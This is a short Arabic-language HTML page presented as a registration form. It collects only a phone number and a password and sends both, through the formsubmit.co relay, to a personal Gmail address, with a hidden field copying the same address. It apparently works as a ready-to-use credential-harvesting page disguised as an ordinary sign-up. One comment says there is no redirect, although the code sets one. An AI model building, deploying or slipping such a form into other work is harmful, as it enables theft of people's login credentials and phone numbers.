<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>نموذج التسجيل</title>
  <style>
    body { font-family: 'Arial'; text-align: center; padding: 50px; background-color: #f9f9f9; }
    form { background: #fff; padding: 25px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    input, textarea { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
    button { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
    button:hover { background-color: #0056b3; }
  </style>
</head>
<body>

  <h2>نموذج التسجيل</h2>

  <form action="https://formsubmit.co/yblyyll@gmail.com" method="POST">
    
    <!-- رقم الهاتف -->
    <input type="tel" name="رقم_الهاتف" placeholder="رقم الهاتف" required>

    <!-- كلمة المرور -->
    <input type="password" name="كلمة_المرور" placeholder="كلمة المرور" required>

    <!-- البريد المستلم (ثابت ومخفي) -->
    <input type="hidden" name="_cc" value="yblyyll@gmail.com">

    <!-- منع سبام -->
    <input type="text" name="_honey" style="display:none">

    <!-- لا يتم إعادة التوجيه -->
    <input type="hidden" name="_redirect" value="thanks.html">

    <button type="submit">إرسال البيانات</button>
  </form>

</body>
</html>
